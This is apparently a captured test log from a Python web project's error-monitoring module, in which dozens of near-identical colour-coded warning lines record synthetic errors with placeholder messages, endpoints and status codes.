WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 338'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 339'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701888Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 340'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701937Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 341'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701986Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 342'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702034Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 343'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702082Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 344'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702129Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 345'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702177Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 346'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702288Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 347'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702362Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 348'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702418Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 349'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702471Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 350'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702522Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 351'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702578Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 352'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 353'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702731Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 354'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702798Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 355'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 356'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702906Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 357'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.702956Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 358'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703006Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 359'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703066Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 360'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 361'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703167Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 362'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703215Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 363'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703264Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 364'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703366Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 365'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703455Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 366'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 367'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703608Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 368'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703664Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 369'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 370'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 371'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703818Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 372'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 373'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703917Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 374'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.703966Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 375'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704015Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 376'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.704063Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m8[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 377'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
